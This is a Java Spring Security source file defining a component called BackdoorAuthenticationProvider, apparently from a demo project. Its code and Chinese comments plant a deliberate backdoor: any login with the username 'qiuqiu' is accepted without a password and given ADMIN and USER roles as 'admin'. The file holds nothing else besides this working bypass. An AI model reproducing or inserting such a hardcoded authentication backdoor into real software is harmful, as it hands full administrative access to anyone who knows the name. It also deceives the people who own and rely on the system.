package com.butch.greenbirdoa.security;

import java.util.ArrayList;
import java.util.Collection;

import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.stereotype.Component;
/**
*
*  
* 自定义的AuthenticationProvider将会加入AuthenticationProvider集合中,每次都会逐一调用验证.
*/
@Component
public class BackdoorAuthenticationProvider implements AuthenticationProvider {
   
   /**
    * 自定义验证
    * 验证方法,返回一个authentication的实现类,比如UsernamePasswordAuthenticationToken;
    * authentication的getCredentials()代表身份
    */
   @Override
   public Authentication authenticate(Authentication authentication) throws AuthenticationException {
       String name=authentication.getName();
       String password=authentication.getCredentials().toString();
       //自定义验证:开启一个代码层面的后门,只要用户名为qiuqiu,那么不需要密码也能登录,而且有2个最高权限
       if("qiuqiu".equals(name)){
           //添加权限
           Collection<GrantedAuthority> authorityCollection=new ArrayList<>();;
           authorityCollection.add(new SimpleGrantedAuthority("ROLE_ADMIN"));
           authorityCollection.add(new SimpleGrantedAuthority("ROLE_USER"));
           return new UsernamePasswordAuthenticationToken("admin", password, authorityCollection);
       }
       return null;
   }

   /**
    * 告诉security这个provider类支持的验证类型
    */
   @Override
   public boolean supports(Class<?> authentication) {
       return authentication.equals(UsernamePasswordAuthenticationToken.class);
   }

}
